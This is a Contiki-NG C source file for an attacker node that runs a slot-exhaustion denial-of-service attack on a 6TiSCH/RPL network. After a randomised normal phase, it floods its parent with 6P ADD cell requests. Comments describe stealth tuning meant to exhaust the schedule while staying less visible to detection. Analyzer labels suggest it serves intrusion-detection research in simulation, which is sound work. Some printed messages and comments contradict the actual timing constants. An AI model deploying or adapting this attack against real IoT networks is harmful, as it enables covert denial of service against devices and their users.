#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include "net/ipv6/simple-udp.h"
#include "arch/dev/cc2420/cc2420.h"
#include "net/mac/4emac/4emac-private.h"
#include "net/routing/rpl-classic/rpl.h"
#include "net/routing/rpl-classic/rpl-private.h"
#include "net/mac/4emac/6top-pce/6top-pce.h"
#include "net/mac/4emac/6top-pce/6p-protocol.h"
#include "net/mac/4emac/6top-pce/6p-queue.h"
#include "net/mac/4emac/6top-pce/nbr-cell-table.h"
#include "net/mac/4emac/6top-pce/6p-sf.h"
#include "net/app-layer/attack-analyzer/attacker-analyzer.h"

#include "sys/log.h"
#define LOG_MODULE "SlotAttack"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1
#define UDP_CLIENT_PORT 8765
#define UDP_SERVER_PORT 5678

/*
 * Phases - 30-min headless run scheme. Routing-dependent attack:
 * 0-3 min warmup (suppressed), 3-5 min normal phase so attacker joins
 * the DODAG and gets allocated cells before attacking.
 *
 * Stealth knobs:
 *  - SLOT_REQUEST_INTERVAL_S 2 -> 5: 6P ADD bursts every 5s (was 2s);
 *    less obvious in tx_slot_count, slows resource exhaustion.
 *  - SLOT_REQUEST_CELL_NUM 5 -> 2: ask for 2 cells per request, not 5;
 *    gradual exhaustion over time rather than instant sat.
 */
#define ATTACK_DELAY_MIN (20 * 60 * CLOCK_SECOND)  // 60-min run; attack start random in [20,25] min
#define ATTACK_DELAY_MAX (25 * 60 * CLOCK_SECOND)
#define NORMAL_SEND_INTERVAL   (15 * CLOCK_SECOND)

/*
 * Stealth v4 (geri donus): 30s/1cell -> 10s/2cells.
 * v3'teki 30s/1cell ~50 cell talep / 25 dk uretiyordu - schedule
 * (~32 cell) doyurmak icin yeterli ama zar zor; saldiri kozmetiksel
 * sinirdaydi. 10s/2cells = 300 cell / 25 dk: gercekten exhaust eder.
 * v2'nin 5s/2cells (600 cell) seviyesinden hafif ama gercek atak.
 */
#ifndef SLOT_REQUEST_INTERVAL_S
#define SLOT_REQUEST_INTERVAL_S 10
#endif
#define SLOT_REQUEST_INTERVAL  (SLOT_REQUEST_INTERVAL_S * CLOCK_SECOND)

#ifndef SLOT_REQUEST_CELL_NUM
#define SLOT_REQUEST_CELL_NUM 2
#endif

#define JRC_IP_ADDR { 0xfd, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x05 }
uip_ipaddr_t jrc_ip_addr;

static struct simple_udp_connection udp_conn;

/*---------------------------------------------------------------------------*/
PROCESS(udp_client_process, "Slot Exhaustion Attack Client");
AUTOSTART_PROCESSES(&udp_client_process);
/*---------------------------------------------------------------------------*/
static void
udp_rx_callback(struct simple_udp_connection *c,
         const uip_ipaddr_t *sender_addr,
         uint16_t sender_port,
         const uip_ipaddr_t *receiver_addr,
         uint16_t receiver_port,
         const uint8_t *data,
         uint16_t datalen)
{
  LOG_INFO("SLOTATTACK: Received response, ignoring.\n");
}
/*---------------------------------------------------------------------------*/
static void
request_slots_aggressive(void)
{
  rpl_dag_t *dag = rpl_get_any_dag();
  
  if(dag != NULL && dag->preferred_parent != NULL) {
    /* Get parent address */
    const linkaddr_t *parent_lladdr = rpl_get_parent_lladdr(dag->preferred_parent);
    
    if(parent_lladdr != NULL) {
      /* Prepare 6P ADD request packet */
      struct ieee802154_sixp p;
      nbr_cell_table_t *n = nbr_cell_table_get_nbr((linkaddr_t *)parent_lladdr);
      
      if(n != NULL) {
        /* Stealth slot request count (default 2 instead of original 5). */
        uint8_t cell_num = SLOT_REQUEST_CELL_NUM;
        uint8_t cell_option = SIXP_TX_CELL;  /* TX cells */
        
        /* Prepare packet: Three-step transaction (no candidate list) */
        sixp_sf_t *sf = sixp_get_sf(0);  /* Get SF with id 0 */
        if(sf != NULL) {
          uint16_t metadata = METADATA_NULL;
          sixp_protocol_prepare_packet(&p, SIXP_REQUEST, 0xFF, CMD_ADD, 
                                       sf->sf_id, n->seqnum, 
                                       cell_option, (void *)&metadata, cell_num, 0, NULL);
        
          /* Add to queue - send the request */
          sixp_queuebuf_t *q = sixp_queue_add((linkaddr_t *)parent_lladdr, 
                                               3,  /* retry */
                                               0,  /* timeout */
                                               &p, 
                                               &udp_client_process, 
                                               NULL, 
                                               NULL);
          
          if(q != NULL) {
            LOG_INFO("SLOTATTACK: *** Requested %u slots from parent 0x%02x%02x ***\n", 
                     cell_num, parent_lladdr->u8[6], parent_lladdr->u8[7]);
          } else {
            LOG_INFO("SLOTATTACK: Queue full, request failed\n");
          }
        }
      }
    }
  }
}
/*---------------------------------------------------------------------------*/
PROCESS_THREAD(udp_client_process, ev, data)
{
  static struct etimer periodic_timer;
  static struct etimer slot_attack_timer;
  static unsigned count = 0;
  uip_ipaddr_t dest_ipaddr;
  static clock_time_t start_time;
  static uint8_t in_attack_phase = 0;
  static clock_time_t phase1_duration;

  PROCESS_BEGIN();

  printf("==============================================\n");
  printf("SLOT EXHAUSTION ATTACK CLIENT STARTED\n");
  printf("Phase 1: Normal operation for 15 minutes\n");
  printf("Phase 2: Aggressive slot requests every 2 seconds\n");
  printf("==============================================\n");

  /* Manuel olarak fd00::5 adresini ekle */
  uint8_t jrc_addr[16] = JRC_IP_ADDR;
  memcpy(jrc_ip_addr.u8, jrc_addr, 16);

  /* UDP baglantisini baslat */
  simple_udp_register(&udp_conn, UDP_CLIENT_PORT, NULL,
                      UDP_SERVER_PORT, udp_rx_callback);
  
  foure_timesynch_init(0);
  
  /* Ilk fazda etiket: ataksiz (0, ATTACK_TYPE_NONE) */
  attacker_analyzer_init(0, &udp_conn, (void *)&jrc_ip_addr, (unsigned short)UDP_SERVER_PORT, 0, ATTACK_TYPE_NONE);
  
  /* Normal fazda basla */
  start_time = clock_time();
  phase1_duration = ATTACK_DELAY_MIN + (random_rand() % (ATTACK_DELAY_MAX - ATTACK_DELAY_MIN));
  LOG_INFO("Attack delay drawn: %lu sec (uniform [20,25] min)\n", (unsigned long)(phase1_duration / CLOCK_SECOND));
  etimer_set(&periodic_timer, (clock_time_t)(random_rand() % NORMAL_SEND_INTERVAL));
  etimer_set(&slot_attack_timer, SLOT_REQUEST_INTERVAL);

  printf("SLOTATTACK: udp_bind() completed\n");

  while(1) {
    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&periodic_timer) || 
                             etimer_expired(&slot_attack_timer));

    /* Check if we should enter attack phase */
    clock_time_t elapsed = clock_time() - start_time;
    uint8_t new_phase = (elapsed >= phase1_duration);
    if(new_phase && !in_attack_phase) {
      in_attack_phase = 1;
      printf("==============================================\n");
      printf("*** SLOT EXHAUSTION ATTACK PHASE STARTED ***\n");
      printf("Will request 5 slots every 2 seconds!\n");
      printf("Network bandwidth will be exhausted!\n");
      printf("==============================================\n");
      LOG_INFO("SLOTATTACK: Switching to SLOT EXHAUSTION attack mode\n");
      /* Etiketi saldiri olarak guncelle: 1, ATTACK_TYPE_SLOT_EXHAUSTION */
      attacker_analyzer_set_attack_mode(1, ATTACK_TYPE_SLOT_EXHAUSTION);
    }

    /* Aggressive slot requests in attack phase */
    if(in_attack_phase && etimer_expired(&slot_attack_timer)) {
      request_slots_aggressive();
      etimer_set(&slot_attack_timer, SLOT_REQUEST_INTERVAL);
    }

    /* Send telemetry packets */
    if(etimer_expired(&periodic_timer)) {
      if(NETSTACK_ROUTING.node_is_reachable() && NETSTACK_ROUTING.get_root_ipaddr(&dest_ipaddr)) {
        /* Send to DAG root */
        {
          uint32_t packed = attacker_pack_app_pkt((uint32_t)count);
          simple_udp_sendto(&udp_conn, &packed, sizeof(packed), &dest_ipaddr);
        }
        count++;

        /* Update packet count for analyzer */
        attacker_analyzer_set_app_packet_count(count);
      }

      /* Jitter ekle */
      etimer_set(&periodic_timer, NORMAL_SEND_INTERVAL - CLOCK_SECOND + (clock_time_t)(random_rand() % (2 * CLOCK_SECOND)));
    }
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/

